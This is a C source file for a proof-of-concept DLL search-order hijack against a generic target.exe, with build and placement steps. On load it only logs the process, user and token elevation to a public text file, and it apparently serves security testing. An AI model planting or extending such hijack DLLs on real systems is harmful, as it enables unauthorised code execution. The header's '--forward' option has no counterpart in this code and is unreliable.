/* target.dll — DLL search-order hijack PROOF for target.exe
 *
 * Proves only that this DLL was loaded, and under which token. It writes one text file and
 * returns. It does not forward exports (add them with a .def file if the host needs them to
 * keep running), does not spawn anything, and does not persist.
 *
 * No export forwarding: the host may fail after loading this. Pass --forward <real.dll> to generate a forwarding .def.
 *
 * Build (Linux, mingw):   x86_64-w64-mingw32-gcc -shared -o target.dll poc.c 
 * Build (Windows, MSVC):  cl /LD poc.c /Fe:target.dll advapi32.lib
 * Place in the directory the loader searches, start target.exe, read C:\Users\Public\wh_proof.txt
 */
#include <windows.h>
#include <stdio.h>

static void proof(void) {
    char user[256] = {0}; DWORD n = sizeof(user);
    char image[MAX_PATH] = {0};
    GetUserNameA(user, &n);
    GetModuleFileNameA(NULL, image, MAX_PATH);
    HANDLE t = NULL; DWORD elev = 0, sz = sizeof(elev);
    TOKEN_ELEVATION te = {0};
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        DWORD ret = 0;
        GetTokenInformation(t, TokenElevation, &te, sizeof(te), &ret);
        elev = te.TokenIsElevated;
        CloseHandle(t);
    }
    FILE *f = fopen("C:\\Users\\Public\\wh_proof.txt", "a");
    if (!f) return;
    SYSTEMTIME st; GetLocalTime(&st);
    fprintf(f, "[%04d-%02d-%02d %02d:%02d:%02d] target.dll loaded by pid=%lu image=%s user=%s elevated=%lu\n",
            st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
            GetCurrentProcessId(), image, user, elev);
    fclose(f);
}

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    if (reason == DLL_PROCESS_ATTACH) { DisableThreadLibraryCalls(h); proof(); }
    return TRUE;
}
